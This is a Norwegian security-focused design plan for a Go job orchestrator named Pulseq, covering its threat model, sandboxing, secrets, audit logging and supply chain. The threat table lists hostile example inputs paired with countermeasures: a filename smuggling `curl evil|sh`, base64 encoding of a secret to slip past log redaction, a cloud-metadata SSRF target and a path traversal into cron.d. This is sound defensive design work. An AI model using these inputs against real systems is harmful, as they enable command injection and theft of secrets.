# Pulseq — prosjektplan sett fra sikkerhetsskeptikeren

Perspektiv: Pulseq er ikke «en orchestrator som tilfeldigvis kjører kommandoer». Pulseq **er** en fjernstyrt
kommandokjører med persistent tilstand, planlagt utløsning og nettverksflate. Alt annet er innpakning.
Denne planen designer produktet ut fra det.

---

## 1. Sikkerhetstesen

**Vi kan ikke hindre kodeutførelse — det er produktet.** Vi kan bare kontrollere fire ting:

| Spørsmål | Kontroll |
|---|---|
| Hvem får definere hva som kjøres? | Autorisasjon på jobbspec (den farligste rettigheten i systemet) |
| Hvem/hva får utløse en kjøring? | Trigger-autentisering (HMAC, tokens, peercred) |
| Som hvem, med hva, hvor lenge kjører det? | Utføringsidentitet, cgroups, sandkasse, timeout |
| Kan vi i etterkant bevise hva som skjedde? | Hash-kjedet audit-logg, uforfalskbar per-run-logg |

To konsekvenser som styrer hele arkitekturen:

1. **Skriverett på jobbdefinisjon ≡ kodeutførelse som utføringsbrukeren.** «Rediger jobb» er derfor en
   *høyere* privilegie enn «kjør jobb», ikke en lavere. De fleste orchestratorer roter dette til.
2. **Komponenten med nettverksflaten skal aldri ha rett til å bli root.** Hele klassen av Jenkins-aktige
   kompromitteringer (parser-bug i kontrollplanet → RCE som kontrollplan-brukeren → kontrollplanet er root)
   elimineres av prosessdeling, ikke av å skrive færre bugs.

---

## 2. Trusselmodell

### 2.1 Aktører

| Aktør | Antatt evne | Antatt intensjon |
|---|---|---|
| **A1 Admin** | Full kontroll over vert | Betrodd. Kompromittering = game over, utenfor scope |
| **A2 Jobbforfatter** | Skriver jobbspec | Delvis betrodd. Skal ikke kunne eskalere forbi sin egen utføringsbruker |
| **A3 Operatør** | Trigger/pause/kansellerer/avspiller | Skal *ikke* kunne endre hva som kjøres |
| **A4 Leser** | Ser status, historikk, logger | Skal ikke se secrets |
| **A5 Ekstern trigger-kilde** | Sender webhook-payload | Ubetrodd. Payload er alltid data, aldri kode |
| **A6 Sensor-mål** | Kontrollerer API/filnavn/DB-rader sensoren leser | Ubetrodd. Kan forsøke å styre hva som kjøres via data |
| **A7 Jobbprosessen selv** | Vilkårlig kode som utføringsbruker | Ubetrodd relativt til *andre* jobber og til kontrollplanet |
| **A8 Annen lokal bruker** | Uprivilegert konto på verten | Skal ikke kunne lese secrets, logger, DB, socket |
| **A9 Nettverksangriper** | Når API/UI/webhook-port | Uautentisert. Skal ikke komme forbi auth-laget |
| **A10 Leverandørkjeden** | Kompromittert avhengighet eller byggepipeline | Skal kreve mer enn én kompromittert kontrollpunkt |

### 2.2 Tillitsgrenser

```
                     ┌─────────── TG1: nett ──────────┐
  A9 ──HTTP/TLS──►   │  API-lytter / webhook-lytter   │
  A5 ──webhook──►    │  (i pulseqd)                   │
                     └────────────┬───────────────────┘
                     ┌─────────── TG2: lokal IPC ─────┐
  A2/A3/A4 ──CLI──►  │  unix socket (SO_PEERCRED)     │
                     └────────────┬───────────────────┘
                     ┌─── pulseqd (uprivilegert 'pulseq') ───┐
                     │ scheduler | sensor-eval | API | SQLite│
                     └────────────┬──────────────────────────┘
                     ┌─────────── TG3: exec-protokoll ┐
                     │ pulseq-exec (evt. root, liten) │
                     └────────────┬───────────────────┘
                     ┌─────────── TG4: kjerne/cgroup ─┐
  A7 ◄────────────►  │ jobbprosess (per-jobb bruker,  │
                     │ egen cgroup, landlock)         │
                     └────────────────────────────────┘
```

### 2.3 Konkrete angrepsscenarier

| # | Scenario | Motmiddel |
|---|---|---|
| T1 | A6 legger fil ved navn `$(curl evil\|sh).csv` i objektlager; sensor sender navnet til jobben | Ingen shell. Argv-array, aldri strengkonkatenering. Templating skjer *per argv-element*, etter splitting |
| T2 | A5 sender forfalsket webhook og starter produksjonsjobb | HMAC-SHA256 over rå body + timestamp i digest, konstant-tid-sammenligning, ±300 s vindu, replay-cache |
| T3 | A5 replayer en gyldig webhook 10 000 ganger | Delivery-id dedup + `run_key`-idempotens + rate limit + concurrency-tak |
| T4 | A3 (kun operatør) endrer jobbspec for å eskalere | Spec-skriving krever `author`-rolle; default er filbasert spec (API kan ikke skrive i det hele tatt) |
| T5 | A7 leser secrets tilhørende en annen jobb | Per-jobb secret-materialisering i tmpfs 0400 eid av jobbens egen uid, avmontert etter run |
| T6 | A7 skriver `echo $DB_PASSWORD \| base64` for å omgå redaksjon | Redaksjon er *sikkerhetsnett*, ikke grense. Reell grense: logg lesbar kun for de som allerede har secret-nivå tilgang |
| T7 | A7 forker daemon som overlever run-slutt og fortsetter å bruke ressurser | Egen cgroup per run + `cgroup.kill` ved avslutning, ikke SIGKILL til PID |
| T8 | A7 fyller disken med 500 GB stdout | Hard log-cap per steg + per run; overskridelse dreper run med `log_limit_exceeded` |
| T9 | A8 leser `/var/lib/pulseq/pulseq.db` og henter tokens | DB 0600, katalog 0700, tokens lagret som SHA-256, secrets aldri i klartekst i DB |
| T10 | A6 gir sensoren en URL som peker på `169.254.169.254` (cloud metadata) | SSRF-vern: deny-liste for loopback/link-local/private nett, revalidering ved redirect, respons-størrelsestak |
| T11 | Jobbspec definerer artefaktsti `../../etc/cron.d/x` | `os.Root`-basert filtilgang (Go 1.24+) — traverseringsforsøk avvises, symlink kan ikke peke ut av roten |
| T12 | Cron-uttrykk `0 0 30 2 *` (finnes aldri) får scheduler til å loope | Hard iterasjonsgrense i «next tick»-søk, timeout, avvis uttrykk uten treff innen horisont |
| T13 | YAML-spec med rekursive aliaser (billion laughs) | TOML som primærformat; hvis YAML: strict-mode, aliasgrense, dybdegrense, størrelsesgrense |
| T14 | A2 setter `user: root` i sin jobbspec | Tillatte utføringsbrukere er en admin-styrt allowlist i systemkonfig, aldri i jobbspec |
| T15 | Kompromittert Go-modul stjeler secrets ved init() | Minimalt dep-tre, go.sum, govulncheck i CI, dep-ADR, ingen in-process plugins |
| T16 | Angriper med DB-skriverett sletter audit-spor | Hash-kjede + speiling til journald (annen eier) + signert anker (fase 5) |
| T17 | A7 leser andre jobbers logger via filsystemet | Jobbprosessen skriver aldri direkte til loggfil; workeren leser pipe og skriver som logg-eier |
| T18 | To pulseqd-instanser starter samme run etter restart | Lease-tabell med CAS + `run_key` unik indeks |

### 2.4 Ikke-mål (skrives i `SECURITY.md`, ikke skjules)

- **Ingen forsvar mot kernel-exploits fra jobbprosessen.** Trenger du det, kjør Pulseq i en VM/gVisor.
  Landlock og cgroups reduserer blast radius; de er ikke en tenant-grense.
- **Ingen hard multi-tenancy.** Pulseq er «ett team, én tillitssone» i v1.
- **Ingen beskyttelse mot ondsinnet admin.**
- **Redaksjon garanterer ikke at secrets ikke lekker til logg.** Dokumenteres eksplisitt.
- **Ingen konfidensialitet mot den som eier utføringsbrukeren.**

---

## 3. Sikkerhetsarkitektur

### 3.1 Prosessdeling (den viktigste enkeltbeslutningen)

Fire binærer, fire tillitsnivåer:

| Binær | Bruker | Ansvar | Nettverksflate |
|---|---|---|---|
| `pulseqd` | `pulseq` (uprivilegert) | Scheduler, sensor-evaluator, API/UI, eneste SQLite-skriver | Ja (fase 4+) |
| `pulseq-exec` | `root` *kun* når per-jobb-bruker er påslått | Motta validert run-spec, sette opp cgroup/uid/sandkasse, fork+exec, streame output | Nei — kun én unix socket mot `pulseqd` |
| `pulseq-shim` | Jobbens uid | Setter Landlock/`NoNewPrivileges`/rlimits i barnet, så `execve` | Nei |
| `pulseq` (CLI) | Brukeren selv | Klient over unix socket eller HTTPS | — |

Begrunnelser:

- All parsing av ubetrodd input (HTTP, JSON, YAML/TOML, cron-uttrykk, webhook-body) skjer i `pulseqd`,
  som **aldri kan bli root**. En RCE der gir angriperen `pulseq`-brukerens rettigheter — ikke verten.
- `pulseq-exec` er den eneste privilegerte koden. Målsetting: **< 600 linjer, null eksterne avhengigheter,
  fuzzet protokoll**. Den tar imot en *ferdig kanonisert, typet* run-spec — den parser aldri jobbfiler,
  aldri YAML, aldri cron.
- Protokollen mellom `pulseqd` og `pulseq-exec` er lengde-prefikset, streng-typet, versjonert, med
  eksplisitt allowlist: `exec_user` må finnes i `/etc/pulseq/exec-users.allow`, `argv[0]` må være absolutt
  sti, cgroup-grenser må ligge innenfor systemkonfigurerte tak. **`pulseq-exec` stoler ikke på `pulseqd`.**
- Trenger du ikke per-jobb-bruker: kjør i `same-user`-modus. Da spawner `pulseqd` selv, `pulseq-exec`
  finnes ikke, og det finnes ingen privilegert kode i det hele tatt. **Dette er MVP-standarden.**

### 3.2 Utføringsmodell

**Argv, ikke kommandostreng.** Jobbspec:

```toml
[[job.steps]]
name = "extract"
argv = ["/usr/local/bin/extract", "--input", "{{ trigger.object_key }}", "--out", "/srv/data"]
```

Regler, håndhevet i validator:

- `argv` er en liste. Det finnes **ingen** `command: "en streng"`-form.
- `argv[0]` må være absolutt sti. Ingen `exec.LookPath`, ingen PATH-avhengighet, ingen `ErrDot`-fallgruve.
- `shell = true` finnes som eksplisitt opt-in, gir advarsel ved validering, markeres i UI/CLI-listing,
  og skrives til audit ved hver run. Kan slås av globalt med `allow_shell = false` (anbefalt default i prod).
- Templating (`{{ }}`) evalueres **per argv-element, etter splitting**. Resultatet blir aldri splittet på
  whitespace. Et filnavn med mellomrom eller `;` blir ett argument, punktum finale.
- Templating har fast, liten funksjonsflate (ingen `exec`, ingen filtilgang, ingen nettverk). Vurder å
  droppe templating helt i MVP og kun injisere kontekst som miljøvariabler.

**Miljø: deny-by-default.** Jobben arver *ikke* `pulseqd`s env. Startpunkt er tomt; deretter:
`PATH` (fast, konfigurerbar, aldri arvet), `HOME`, `TZ`, `LANG`, jobbens egne `env`-nøkler, og
Pulseq-kontekst (`PULSEQ_RUN_ID`, `PULSEQ_STEP`, `PULSEQ_ATTEMPT`, `PULSEQ_TRIGGER_KEY`,
`PULSEQ_SECRETS_DIR`). Alt annet krever eksplisitt `inherit_env = ["FOO"]`.

**Arbeidskatalog:** per-run katalog under `/var/lib/pulseq/work/<run_id>`, opprettet med jobbens uid,
0700, slettet etter retensjonsperiode. `PrivateTmp`-ekvivalent (egen mount-namespace med tom `/tmp`) i
`strict`-modus.

**Avslutning:** SIGTERM til hele cgroupen → `grace_period` (default 30 s) → `cgroup.kill`. Timeout er
**obligatorisk**; jobber uten `timeout` får systemets default (1 t), og systemet har et hardt tak.

### 3.3 Sandkasse-nivåer

Deklarativt per jobb, med et helt sentralt prinsipp: **`strict` skal feile, ikke degradere.**
Best-effort-degradering som stille slår av vern er hvordan sandkasser blir sikkerhetsteater.

| Nivå | Innhold | Krav |
|---|---|---|
| `none` | Kun timeout + cgroup-kill | — |
| `basic` (default) | + `NoNewPrivileges`, tom env-baseline, rlimits (NOFILE, NPROC, FSIZE, CORE=0), egen cgroup med `memory.max`/`cpu.max`/`pids.max`, per-run workdir | cgroup v2 |
| `strict` | + Landlock RO/RW-pathsett, privat `/tmp`, valgfri `PrivateNetwork`, valgfri `ConnectTCP`-allowlist | kernel ≥ 6.7 (Landlock ABI 4+), feiler hardt hvis utilgjengelig |
| `besteffort` | Som `strict`, men degraderer og **logger nøyaktig hvilke vern som ble droppet** i run-metadata | — |

Implementasjon:

- **cgroups**: på systemd-verter bruk `systemd-run --scope --property=MemoryMax=… --property=CPUQuota=…
  --uid=… --slice=pulseq.slice` — null kode, gratis delegering, gratis uid-bytte. Fallback: skriv direkte
  til delegert `pulseq.slice` via `cgroup.subtree_control` (krev `Delegate=yes` i unit-fila).
- **Landlock**: `github.com/landlock-lsm/go-landlock`. Må settes i *barnet*, ikke i `pulseqd` (som trenger
  DB-tilgang) — derav `pulseq-shim`: `pulseq-exec` forker `pulseq-shim`, shimmen setter Landlock + rlimits
  + `NoNewPrivileges` og `execve`r målet. Restriksjoner arves av alle etterkommere.
- **Per-jobb-bruker**: `SysProcAttr.Credential{Uid, Gid, Groups: []}` — merk `NoSetGroups: false` så
  supplementære grupper faktisk nullstilles. Uid må komme fra admin-allowlist, aldri fra jobbspec.

### 3.4 Identitet og autorisasjon

**MVP: ingen TCP-lytter i det hele tatt.** Kun `/run/pulseq/pulseq.sock` (0660, gruppe `pulseq`).
Autorisasjon via `SO_PEERCRED` → uid/gid → rolle fra `/etc/pulseq/roles.toml`. Dette fjerner med ett grep
hele klassen «orchestrator eksponert på 0.0.0.0 uten auth», som er den enkeltårsaken til flest reelle
CI/CD-kompromitteringer.

Roller (additive, minst privilegium):

| Rolle | Kan |
|---|---|
| `viewer` | Lese status, historikk, skip-grunner, logger (redigert) |
| `operator` | + trigge, pause/resume, kansellere, replay av eksisterende steg |
| `author` | + opprette/endre jobbspec, schedules, sensors |
| `admin` | + secrets, tokens, exec-brukere, retensjon, systemkonfig |

`author` er den kritiske. To leveringsveier for spec:

- **`file`-modus (default, anbefalt):** jobber leses fra `/etc/pulseq/jobs/*.toml`. API-et har *ingen*
  skrive-endepunkt. Endringer går via git + konfigurasjonsstyring, med sin egen review. `SIGHUP`/inotify
  laster på nytt; hver reload skrives til audit med filhash.
- **`db`-modus (opt-in):** spec kan skrives via API/UI. Krever `author`, versjoneres i `job_version`
  (append-only), diff logges i audit.
- **Signeringskrav (fase 5, opt-in):** spec-katalogen må ha gyldig `ssh-keygen -Y sign`-signatur fra en
  nøkkel i `allowed_signers` før lasting. Gir motstand mot T4/T15 selv ved kompromittert filskriving.

**Fase 4 – HTTPS-API:** bearer-token, 256 bit fra `crypto/rand`, format `pq_<12 tegn prefiks>_<base64>`.
DB lagrer kun SHA-256 + prefiks + rolle + `expires_at` + `last_used_at`. Prefiks vises i UI så en lekket
token kan identifiseres og trekkes tilbake uten at DB-en er en risiko. Default bind `127.0.0.1`.
TLS obligatorisk for ikke-loopback. Ingen egen passorddatabase — vi vil ikke eie passordlagring;
mennesker autentiseres via reverse proxy med OIDC/mTLS, maskiner via tokens.

**Web-UI (fase 4):** server-rendret `html/template`, ingen JS-bundler, ingen CDN (CSP: `default-src 'self';
script-src 'self'; object-src 'none'; frame-ancestors 'none'`), ingen inline script. Mutasjoner krever
CSRF-token + `Origin`-sjekk. Cookies `HttpOnly; Secure; SameSite=Strict`. UI er **read-only i første
versjon** — mutasjon gjennom UI legges til først når CSRF/session-modellen er testet.

### 3.5 Webhook-inngang

Separat lytter, separat port/socket, egen konfig — bevisst ikke slått sammen med API-et.

- Endepunkt: `POST /hook/<sensor-navn>`. **Endepunktet er bundet til én forhåndsdefinert sensor.**
  Payload kan aldri velge hvilken jobb som kjøres — den er ren data.
- `X-Pulseq-Timestamp` + `X-Pulseq-Signature: v1=<hex>`, HMAC-SHA256 over `timestamp || "." || rå body`.
  Timestamp **må** inngå i digesten, ellers kan den manipuleres fritt.
- `hmac.Equal` (konstant tid). Aldri `==`.
- Vindu ±300 s. Replay-cache på `X-Pulseq-Delivery` i 2× vinduet.
- Body-tak (default 256 KiB), lesetimeout, per-endepunkt rate limit, per-endepunkt secret.
- Signaturfeil → 401 med *identisk* respons og responstid som ukjent endepunkt (ingen orakel).
- Alle avviste hooks logges med grunn — dette er tidlig-varsel-signalet.

### 3.6 Sensor-sikkerhet

Sensorer er den mest oversette angrepsflaten: de leser ubetrodd ekstern tilstand og gjør den til
handling.

- **All sensor-output er ubetrodd data.** Trigger-payload lagres som opake bytes, valideres mot skjema
  før bruk, og går aldri inn i shell eller stier uten kanonisering.
- **SSRF-vern** for HTTP-sensorer: URL-allowlist per sensor (foretrukket) eller deny-liste
  (loopback, `169.254.0.0/16`, `fd00::/8`, RFC1918 med mindre eksplisitt tillatt). DNS-resultat
  revalideres etter oppslag (DNS rebinding). Redirect følges maks 3 ganger og **revalideres for hver hop**.
  Timeout + respons-størrelsestak.
- **Cursor er ubetrodd etter første eksterne input.** Valider type/format ved lesing fra DB;
  en korrupt cursor skal gi `skip_reason`, ikke panikk eller uendelig løkke.
- **`exec`-sensorer (kjør kommando, parse output) er jobbdefinisjon i forkledning** → krever `author`,
  ikke `operator`. Kjører med samme sandkasse-regler som en jobb.
- Sensor-evaluering har eget timeout og egen concurrency-grense. En treg sensor skal ikke stoppe
  scheduleren (separate goroutine-pools, egen lease).
- Multi-trigger fan-out har hardt tak (default 1000 triggere per tick) — ellers er en katalog med
  1 M filer en DoS.

### 3.7 Audit-logg

Egen append-only tabell. Hver mutasjon, uten unntak: hvem (identitet + auth-metode + kildeadresse),
hva (handling + kanonisk diff), når (UTC monotont sekvensnummer), resultat.

```
audit_log(seq INTEGER PRIMARY KEY, ts_utc, actor, auth_method, action,
          target_type, target_id, detail_json, prev_hash, entry_hash)
entry_hash = SHA256(prev_hash || canonical_json(row uten entry_hash))
```

Ærlig om begrensningen: **en hash-kjede i samme SQLite-fil som angriperen kan skrive til, kan
regenereres.** Kjeden alene er ikke tamper-evident. Derfor:

- MVP: kjede + samtidig speiling av hver audit-hendelse til journald/syslog (annen eier, annen
  retensjon). `pulseq verify-audit` verifiserer kjeden og krysssjekker mot journal.
- Fase 5: periodisk signert anker (Ed25519, nøkkel i systemd credential/TPM) skrevet til separat fil
  + valgfritt eksternt endepunkt. Da blir det reelt tamper-evident.

Hendelser som **alltid** auditeres: spec opprettet/endret/slettet/lastet (med filhash), trigger
(manuell/schedule/sensor/webhook), pause/resume, cancel, replay, token opprettet/tilbakekalt, secret
opprettet/rotert/lest-av-run, exec-user-endring, konfigreload, autentiseringsfeil, sandkasse-degradering.

### 3.8 Logglagring og redaksjon

- Logger ligger som filer under `/var/lib/pulseq/logs/<run_id>/<step>.<attempt>.log`, **ikke** som BLOBs
  i SQLite (unngår DB-vekst-DoS og gir billig rotasjon). DB holder kun peker + størrelse + hash.
- **Jobbprosessen skriver aldri direkte til loggfilen.** Den får en pipe; workeren leser og skriver.
  Ellers kan jobben symlinke, trunkere eller forfalske andre runs' logger (T17).
- Rettigheter: fil 0600, katalog 0700, eier = logg-brukeren. Jobbens uid har ingen tilgang.
- Hard cap per steg (default 64 MiB) og per run. Overskridelse → run drepes, status
  `log_limit_exceeded`. Rate-cap på linjer/s mot log-flood.
- Strukturert logg (`log/slog`, JSON) for Pulseqs egne hendelser. Jobbens stdout/stderr lagres som
  **opake bytes**, aldri tolket som logglinjer (log injection).
- **Redaksjon:** streaming-matcher over stdout/stderr med overlappende buffer (et secret kan splittes
  over write-grenser — naiv per-linje-matching bommer). Match på eksakt verdi **og** på automatisk
  genererte varianter: base64, base64url, URL-encoded, hex, JSON-escaped. Erstatt med `[redacted:NAVN]`.
  Secrets kortere enn 8 tegn nektes redaksjon (for mange falske positive) og gir advarsel ved definisjon.
- **Redaksjon dokumenteres eksplisitt som sikkerhetsnett, ikke sikkerhetsgrense.** Den reelle grensen er
  at logger for en jobb kun er lesbare for identiteter som allerede har tilgang til jobbens secrets-nivå.
  Introduser `log_visibility = "viewer" | "operator" | "admin"` per jobb.

### 3.9 Filsystem-layout og rettigheter

```
/etc/pulseq/                 0755 root:root
  config.toml                0640 root:pulseq   # systemkonfig, exec-user-allowlist, tak
  roles.toml                 0640 root:pulseq
  exec-users.allow           0640 root:pulseq   # kun root kan utvide utføringsidentiteter
  jobs/*.toml                0644 root:root     # spec, file-modus
/var/lib/pulseq/             0700 pulseq:pulseq
  pulseq.db, -wal, -shm      0600 pulseq:pulseq
  logs/<run>/                0700 pulseq:pulseq
  work/<run>/                0700 <jobb-uid>
  secrets/                   0700 pulseq:pulseq  # kun ciphertext
/run/pulseq/
  pulseq.sock                0660 pulseq:pulseq
  exec.sock                  0600 pulseq:root
  secrets/<run>/             tmpfs 0500 <jobb-uid>, avmontert ved run-slutt
```

`pulseqd` setter `umask(0077)` ved oppstart og verifiserer rettigheter på egne kataloger — nekter å
starte hvis DB eller secrets er gruppe/verdens-lesbare (fail closed).

---

## 4. Secrets-design

### 4.1 Prinsipper

1. **Aldri klartekst i SQLite.** DB lagrer referanse eller ciphertext — aldri en brukbar hemmelighet.
2. **Aldri i argv.** `/proc/<pid>/cmdline` er verdenslesbar.
3. **Env er andrevalg, ikke førstevalg.** `/proc/<pid>/environ`, core dumps og arv til barneprosesser
   lekker env. Default er fil i tmpfs.
4. **Aldri i logg** — med redaksjon som nett og tilgangskontroll som grense.
5. **Eksplisitt tilknytning.** En jobb får kun de secrets som er navngitt i dens spec. Ingen ambient tilgang.

### 4.2 Backends

| Backend | Fase | Beskrivelse |
|---|---|---|
| `file:` | MVP | Les fra fil, 0400, eid av `pulseq`. Enkelt, revisjonsvennlig, fungerer med eksisterende verktøy |
| `systemd-creds:` | MVP+ | Les fra `$CREDENTIALS_DIRECTORY`. Gratis at-rest-kryptering, tmpfs, RAM-låst, TPM-binding via `LoadCredentialEncrypted=` |
| `age:` | Fase 3 | Envelope: verdi kryptert til age-recipient. DB holder kun ciphertext; privatnøkkel utenfor DB (fil/systemd-cred/TPM). Gjør DB-backup ufarlig |
| `exec:` | Fase 5 | Kall ut til Vault/AWS SM/1Password via kommando. Cache i minne med TTL, aldri på disk |

Anbefalt kombinasjon i produksjon: `age:` for verdier i DB, med age-identiteten levert via
`LoadCredentialEncrypted=` — da er DB-lekkasje alene verdiløs, og nøkkelen er TPM-bundet til verten.

### 4.3 Levering til jobben

```toml
[[job.steps]]
argv = ["/usr/local/bin/sync"]
secrets = [
  { name = "DB_PASSWORD", ref = "age:prod/db", mode = "file" },   # default
  { name = "API_TOKEN",   ref = "file:/etc/pulseq/secrets/api",  mode = "env" },
]
```

- `mode = "file"` (default): materialiseres i `/run/pulseq/secrets/<run_id>/DB_PASSWORD`, tmpfs,
  0400, eid av jobbens uid. `PULSEQ_SECRETS_DIR` peker dit. Avmontert og nullet ved run-slutt,
  også ved crash (cleanup-reconciliation ved oppstart).
- `mode = "env"`: for verktøy som krever det. Gir advarsel ved validering.
- Dekryptering skjer i `pulseqd`, klartekst holdes i `[]byte` som nulles etter skriving, aldri i `string`
  (Go-strenger kan ikke nulles og kan bli liggende i GC-heapen).
- Hver `secret_read`-hendelse auditeres med run-id og secret-navn (aldri verdi).
- Rotasjon: secrets er versjonerte; en kjørende run beholder sin versjon, nye runs får den nye.

---

## 5. Leverandørkjede

Prinsipp: **hver ny direkte avhengighet er en sikkerhetsbeslutning og krever en ADR.** Måltall:
≤ 12 direkte moduler i `go.mod` ved 1.0.

- `go.sum` + `GOFLAGS=-mod=readonly`, sumdb aldri deaktivert, ingen `replace` mot lokale stier i main.
- **Ingen in-process plugins.** Go `plugin`/`.so` er en enorm angrepsflate og bryter statisk binær.
  Utvidelser er subprosesser med definert protokoll — samme sandkasse som jobber.
- CI på hver PR: `go vet`, `staticcheck`, `gosec`, `go test -race`, `govulncheck`, CodeQL, `gofumpt`.
  Ukentlig `govulncheck` på main uavhengig av commits.
- Fuzzing (Go native) på: webhook-signatur/header-parsing, spec-parser, cron-parser, exec-protokoll,
  redaksjons-matcher, cursor-deserialisering. Corpus i repo, kjøres i nightly.
- Bygg: `-trimpath`, `CGO_ENABLED=0`, `-buildvcs=true`, reproduserbar (verifiseres i CI ved dobbeltbygg).
- Release: GoReleaser + `cosign` keyless (Fulcio/Rekor) på binærer og checksums, SBOM i CycloneDX
  (`cyclonedx-gomod`) vedlagt hver release, SLSA-provenance nivå 3 via `slsa-github-generator`.
- `SECURITY.md` med kontaktpunkt, forventet responstid og eksplisitt trusselmodell-avgrensning.
  Sikkerhetsadvarsler i eget spor med CVE-tildeling.
- Signert `sha256sum`-manifest og verifiseringsinstruks i README — signering uten dokumentert
  verifisering er teater.

---

## 6. MVP-sikkerhet vs. senere

Skillekriteriet er **ikke** «hva er viktigst», men **hva kan ikke ettermonteres uten å endre
tillitsmodellen**. Å legge til dybdeforsvar senere er billig. Å endre en antagelse om hvem som stoler på
hvem, etter at brukere har bygget rundt den, er dyrt og farlig.

### Må være der fra første kjørbare versjon

| Tiltak | Hvorfor ikke senere |
|---|---|
| Argv-basert exec, ingen implisitt shell | Spec-formatet er en offentlig kontrakt. Å stramme det senere brekker alle brukere |
| Kun unix socket, ingen TCP | Legger man til nettverks-API først, må all senere auth ettermonteres på et system brukerne allerede eksponerer |
| Egen systembruker, `pulseqd` aldri root | Rettighetsantagelser sprer seg i koden |
| Obligatorisk timeout + cgroup-kill av hele treet | Prosess-livssyklus er kjernedesign, ikke et tillegg |
| Secrets aldri i klartekst i DB | DB-migrering av eksisterende klartekst-secrets = de er allerede i backups |
| Skille mellom `author` og `operator` | Rollemodellen er en kontrakt |
| Audit-tabell med hash-kjede | Manglende historikk kan ikke rekonstrueres bakover |
| Logger 0600, jobben skriver ikke selv til loggfil | Filrettigheter i eksisterende installasjoner er vanskelig å rette |
| `os.Root`-basert filtilgang for alle spec-styrte stier | Traverseringsbugs er lette å så, vanskelige å luke |
| go.sum, govulncheck, minimalt dep-tre | Dep-trær vokser monotont |
| `SECURITY.md` med eksplisitte ikke-mål | Setter forventninger før noen bygger feil rundt produktet |

### Kan trygt komme senere (dybdeforsvar, tillegg)

Per-jobb utføringsbruker + `pulseq-exec` · Landlock/`strict`-sandkasse · HTTPS-API + tokens + TLS ·
Webhook-HMAC · `age:`/`exec:` secret-backends · Web-UI · Signerte jobbspecs · Signert audit-anker ·
SBOM/cosign/SLSA · mTLS/OIDC · Notifikasjoner.

---

## 7. Arkitektur ellers

### 7.1 Datamodell (SQLite)

```
job(id, name UNIQUE, source, spec_hash, enabled, created_at)
job_version(id, job_id, version, spec_toml, spec_hash, author, created_at)   -- append-only
step_def(id, job_version_id, name, argv_json, depends_on_json, retry_json,
         timeout_s, sandbox, exec_user, env_json, secrets_json)
run(id, job_id, job_version_id, run_key, trigger_id, state, attempt,
    started_at, ended_at, exit_reason)
    UNIQUE(job_id, run_key)                       -- idempotens
run_step(id, run_id, step_name, state, attempt, exit_code, started_at,
         ended_at, log_path, log_bytes, log_sha256)
schedule(id, job_id, kind, expr, timezone, paused, catchup, concurrency_limit,
         last_tick_at, next_tick_at)
sensor(id, job_id, kind, config_json, interval_s, paused, last_eval_at)
cursor(sensor_id PRIMARY KEY, value_json, updated_at)
trigger(id, source, source_id, job_id, run_key, payload_sha256, payload_path,
        created_at, outcome, skip_reason)
artifact_ref(id, run_id, step_name, uri, sha256, size, created_at)
secret(id, name UNIQUE, backend, ref_or_ciphertext, version, created_at)
token(id, prefix, sha256, role, expires_at, last_used_at, revoked_at)
lease(name PRIMARY KEY, owner, expires_at, fence INTEGER)
audit_log(seq, ts_utc, actor, auth_method, action, target_type, target_id,
          detail_json, prev_hash, entry_hash)
```

### 7.2 SQLite-disiplin

- WAL, `busy_timeout=5000`, `foreign_keys=ON`, `synchronous=NORMAL`.
- **Én dedikert skriveforbindelse** (`db.SetMaxOpenConns(1)` på en egen `*sql.DB`), all skriving gjennom
  en kø/mutex. Separat lese-pool (N forbindelser, `_txlock=deferred`).
- Alle skrivetransaksjoner starter med `BEGIN IMMEDIATE` — ellers får man `SQLITE_BUSY_SNAPSHOT` ved
  oppgradering fra leser til skriver, som `busy_timeout` ikke redder deg fra.
- Store objekter (logger, trigger-payloads) ut av DB, som filer med hash i DB.
- Migrasjoner: nummererte, framoverrettede, kjørt i én transaksjon, med `PRAGMA user_version`.
  Automatisk backup (`VACUUM INTO`) før migrasjon.

### 7.3 Scheduler og sensors

- Én lease `scheduler` og én per sensor-gruppe. CAS-oppdatering med fencing-token; ingen distribuert
  konsensus.
- Tick-løkke med jitter. `next_tick` beregnes med hard iterasjonsgrense og horisont (T12).
- Timezone per schedule, DST-håndtering eksplisitt testet: hopp over ikke-eksisterende lokaltid,
  kjør kun én gang i repetert time. Lagre alt i UTC.
- Catch-up har tak (`max_catchup_runs`), ellers gir en uke nedetid 10 000 samtidige runs.
- Skip-grunn er et førsteklasses felt på `trigger`, ikke en logglinje. `pulseq explain <job>` leser den.
- Reconciliation ved oppstart: runs i `running` uten levende prosess/cgroup → `interrupted`,
  ikke automatisk restart (at-least-once *start*, ikke at-least-once *fullføring* — dokumenteres).

### 7.4 DAG

- Validering ved spec-lasting, ikke ved kjøring: syklusdeteksjon, ukjente `depends_on`, duplikate
  stegnavn, maks antall steg (default 200), maks fan-out (default 100), maks dybde.
- Topologisk kjøring med konfigurerbar parallellitet. Feil i et steg markerer nedstrøms `skipped`.
- Replay: `pulseq replay <run> --steps failed|from:<navn>` gjenbruker samme `job_version` (aldri
  «siste spec» — ellers kjører replay noe annet enn det du tror).

### 7.5 Observabilitet

- `pulseq status`, `pulseq runs`, `pulseq logs <run> [--step]`, `pulseq explain <job|schedule|sensor>`,
  `pulseq preview <schedule> --n 10`, `pulseq verify-audit`, `pulseq doctor` (sjekker rettigheter,
  cgroup-delegering, Landlock-ABI, kernel-versjon, og rapporterer hvilke vern som faktisk er aktive).
- `pulseq doctor` er et sikkerhetsverktøy: det gjør «hvilke vern er reelt på?» til noe man kan svare på.
- Prometheus-endepunkt (fase 4) på egen, lokal adresse — ikke på API-porten.

---

## 8. Teknologivalg

| Valg | Alternativ vurdert | Begrunnelse |
|---|---|---|
| Go 1.24+ | — | Krever `os.Root` for traverseringssikker filtilgang. Statisk binær, ingen runtime på verten |
| `CGO_ENABLED=0` | cgo-SQLite | Hele minnesikkerhetsprofilen holdes i Go; ingen systembibliotek i angrepsflaten; reproduserbar og kryssbyggbar |
| `modernc.org/sqlite` | `mattn/go-sqlite3` | Ren Go, følger av valget over. Trade-off: lavere throughput — irrelevant for vår last (titalls skrivinger/s) |
| `net/http` + `ServeMux` | chi, gin, echo | Stdlib har rutingen vi trenger siden 1.22. Null ekstra angrepsflate, null dep |
| `log/slog` | zap, zerolog | Stdlib, strukturert, godt nok |
| **TOML** for jobbspec | YAML, JSON | YAML har aliaser/anker (billion laughs), typegjetning («Norway-problemet»: `no` → `false`), merge keys og flere parser-CVE-er. TOML har ingen av delene. YAML kan støttes senere i strict-mode med alias-/dybde-/størrelsesgrenser |
